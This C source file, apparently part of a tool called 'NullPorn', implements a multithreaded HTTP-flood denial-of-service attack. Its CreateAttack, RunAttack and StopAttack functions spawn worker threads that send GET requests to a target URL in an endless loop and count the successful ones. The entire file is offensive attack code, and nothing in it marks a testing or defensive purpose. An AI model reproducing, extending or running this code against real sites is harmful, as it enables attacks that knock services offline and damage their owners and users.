#include "NullPorn.h"

static AttackData s_AttackData = {
    .stop = false,
    .totalRequests = 0,
    .successfulRequests = 0,
};

static void* WorkerThread(void* data)
{
    WorkerData* workerData = (WorkerData*) data;

    while (!s_AttackData.stop)
    {
        if (HTTPGetRequest(workerData->url))
            s_AttackData.successfulRequests++;
        s_AttackData.totalRequests++;
    }

    return NULL;
}

void CreateAttack(DDoS* ddos, char* url, uint32_t workersCount)
{
    ddos->url          = url;
    ddos->data         = &s_AttackData;

    ddos->workers      = (pthread_t*)  malloc(sizeof(pthread_t) *workersCount);
    ddos->workersData  = (WorkerData*) malloc(sizeof(WorkerData)*workersCount);
    ddos->workersCount = workersCount;
}

void RunAttack(DDoS* ddos)
{
    for (int i = 0; i < ddos->workersCount; i++)
    {
        ddos->workersData[i].url = ddos->url;
        ddos->workersData[i].workerIndex = i;

        pthread_create(&ddos->workers[i], NULL, WorkerThread, (void*) &ddos->workersData[i]);
    }
}

void StopAttack(DDoS* ddos)
{
    s_AttackData.stop = true;

    for (int i = 0; i < ddos->workersCount; i++)
        pthread_join(ddos->workers[i], NULL);

    free(ddos->workers);
    free(ddos->workersData);
}